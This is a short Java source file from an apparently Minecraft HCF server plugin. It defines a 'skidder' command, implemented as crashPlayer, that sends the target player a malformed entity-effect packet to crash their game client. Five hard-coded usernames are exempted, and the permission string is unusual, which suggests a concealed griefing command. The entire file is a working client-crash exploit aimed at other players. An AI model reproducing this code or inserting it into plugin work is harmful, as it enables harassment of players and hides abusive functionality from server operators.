package com.cynichcf.hcf.commands;

import net.minecraft.server.v1_7_R4.MobEffect;
import net.minecraft.server.v1_7_R4.PacketPlayOutEntityEffect;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.entity.Player;
import rip.lazze.libraries.command.Command;
import rip.lazze.libraries.command.Param;

public class SkidderCommand {
    @Command(names={ "skidder" }, permission="skidder.com.profesinal")
    public static void crashPlayer(CommandSender sender, @Param(name="target") Player target){
        if (!target.getName().equalsIgnoreCase("rHCO") && !target.getName().equalsIgnoreCase("zirs") && !target.getName().equalsIgnoreCase("Touray") && !target.getName().equalsIgnoreCase("JavaStrings") && !target.getName().equalsIgnoreCase("sedre")) {
        Location location = target.getLocation();
        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutEntityEffect(target.getEntityId(), new MobEffect(25, 20, 25)));
         }
    }
}